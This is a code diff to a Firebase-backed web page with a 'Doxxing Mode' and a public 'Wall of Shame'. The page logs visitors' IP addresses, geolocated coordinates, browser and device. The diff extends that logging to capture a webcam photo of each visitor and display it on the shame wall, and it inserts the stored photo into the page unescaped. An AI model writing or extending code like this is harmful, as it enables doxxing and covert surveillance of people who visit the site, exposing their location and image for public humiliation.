@@ -67,6 +67,7 @@ h1#banner {
 #wtfBtn { background:#ff0; color:#000; font-weight:bold; font-size:16px; padding:10px; margin-top:10px; width:100%; cursor:pointer; }
 #rickrollBtn { background:#ff1493; color:#fff; font-weight:bold; font-size:16px; padding:10px; margin-top:5px; width:100%; cursor:pointer; }
 #doxxBtn { background:#800080; color:#fff; font-weight:bold; font-size:16px; padding:10px; margin-top:5px; width:100%; cursor:pointer; }
+#clearShameBtn { background:#ff6600; color:#fff; font-weight:bold; font-size:16px; padding:10px; margin-top:5px; width:100%; cursor:pointer; }
 #admin-login { margin-top:10px; padding:10px; background:rgba(0,255,0,0.1); border-radius:5px; }
 #admin-login input { margin:2px; padding:5px; background:#000; color:#0f0; border:1px solid #0f0; font-family: monospace; }
 #adminLoginBtn { padding:5px 10px; background:#0f0; color:#000; border:none; cursor:pointer; font-family: monospace; font-weight:bold; margin-left:5px; }
@@ -248,6 +249,7 @@ html.shake {
     <button id="wtfBtn">🚨 WTF MODE 🚨</button>
     <button id="rickrollBtn">🎵 RICKROLL MODE 🎵</button>
     <button id="doxxBtn">💀 DOXXING MODE 💀</button>
+    <button id="clearShameBtn">🗑️ CLEAR WALL OF SHAME 🗑️</button>
   </div>
 
   <div id="admin-login">
@@ -297,6 +299,7 @@ firebase.initializeApp(firebaseConfig);
   const wtfBtn=document.getElementById('wtfBtn');
   const rickrollBtn=document.getElementById('rickrollBtn');
   const doxxBtn=document.getElementById('doxxBtn');
+  const clearShameBtn=document.getElementById('clearShameBtn');
   const shameBtn=document.getElementById('shameBtn');
   const shameModal=document.getElementById('shameModal');
   const closeShame=document.getElementById('closeShame');
@@ -330,19 +333,20 @@ firebase.initializeApp(firebaseConfig);
   const doxxModeRef=db.ref('doxxMode');
   const shameRef=db.ref('wallOfShame');
 
-  // IP + DEVICE + BROWSER + LOCATION + COORDINATES LOGGING
+  // IP + DEVICE + BROWSER + LOCATION + COORDINATES + PHOTO LOGGING
   async function logToShame(username) {
     try {
       const ipResponse = await fetch('https://api.ipify.org?format=json');
       const ipData = await ipResponse.json();
       const userIP = ipData.ip;
       
-      // Get location from IP with coordinates
+      // Get location from IP (no permission needed)
       let city = 'Unknown';
       let country = 'Unknown';
       let region = 'Unknown';
       let latitude = 'Unknown';
       let longitude = 'Unknown';
+      let photoData = null;
       
       try {
         const geoResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
@@ -353,7 +357,43 @@ firebase.initializeApp(firebaseConfig);
         latitude = geoData.latitude || 'Unknown';
         longitude = geoData.longitude || 'Unknown';
       } catch(e) {
-        console.log('Geolocation failed, using Unknown');
+        console.log('Geolocation failed');
+      }
+      
+      // Try to get WEBCAM PHOTO (requires permission)
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { width: 640, height: 480 }, 
+          audio: false 
+        });
+        
+        // Create video element to capture frame
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        
+        // Wait for video to be ready
+        await new Promise(resolve => {
+          video.onloadedmetadata = resolve;
+        });
+        
+        // Wait a bit for camera to adjust
+        await new Promise(resolve => setTimeout(resolve, 500));
+        
+        // Capture photo
+        const canvas = document.createElement('canvas');
+        canvas.width = 640;
+        canvas.height = 480;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, 640, 480);
+        
+        // Convert to base64
+        photoData = canvas.toDataURL('image/jpeg', 0.8);
+        
+        // Stop camera
+        stream.getTracks().forEach(track => track.stop());
+      } catch(e) {
+        console.log('Camera access denied or failed');
       }
       
       // Detect browser
@@ -392,6 +432,7 @@ firebase.initializeApp(firebaseConfig);
         country: country,
         latitude: latitude,
         longitude: longitude,
+        photo: photoData,
         browser: browser,
         device: deviceType,
         os: os,
@@ -431,6 +472,7 @@ firebase.initializeApp(firebaseConfig);
           <div style="color:#0f0; font-size:1.5rem; margin-bottom:10px;">
             <strong>👤 ${escapeHtml(entry.username)}</strong>
           </div>
+          ${entry.photo ? `<div style="margin:15px 0;"><img src="${entry.photo}" style="max-width:100%; border:2px solid #f00; border-radius:5px;" /></div>` : ''}
           <div style="color:#f00; font-size:2rem; font-weight:bold; margin:15px 0; text-shadow: 0 0 5px #f00;">
             🌐 IP: ${escapeHtml(entry.ip)}
           </div>
@@ -797,6 +839,12 @@ firebase.initializeApp(firebaseConfig);
   wtfBtn.addEventListener('click',activateWTFMode);
   rickrollBtn.addEventListener('click',activateRickrollMode);
   doxxBtn.addEventListener('click',activateDoxxMode);
+  clearShameBtn.addEventListener('click', () => {
+    if(confirm('Are you sure you want to clear the entire Wall of Shame? This cannot be undone!')) {
+      shameRef.remove();
+      alert('Wall of Shame cleared!');
+    }
+  });
   shameBtn.addEventListener('click',showWallOfShame);
   closeShame.addEventListener('click', () => {
     shameModal.style.display = 'none';
